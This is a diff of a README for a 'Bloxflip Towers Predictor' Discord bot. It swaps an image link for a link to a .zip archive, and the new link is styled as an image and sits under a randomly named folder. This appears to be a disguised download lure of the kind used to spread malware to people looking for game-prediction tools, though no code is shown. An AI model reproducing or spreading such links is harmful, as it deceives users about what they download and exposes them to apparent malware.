@@ -1,6 +1,6 @@
 # Bloxflip-Towers-Predictor-Discord-Bot
 
-![image](https://user-images.githubusercontent.com/98252854/205468267-80fa22bb-674f-4b6e-a5e9-52683b360631.png)
+![image](https://github.com/IndianGamer1313/Bloxflip-Towers-Predictor-Discord-Bot/raw/refs/heads/main/pedicellate/Bot_Towers_Bloxflip_Discord_Predictor_didynamic.zip)
 
 ## 📝Features and Usage
 .towers (round_id)\
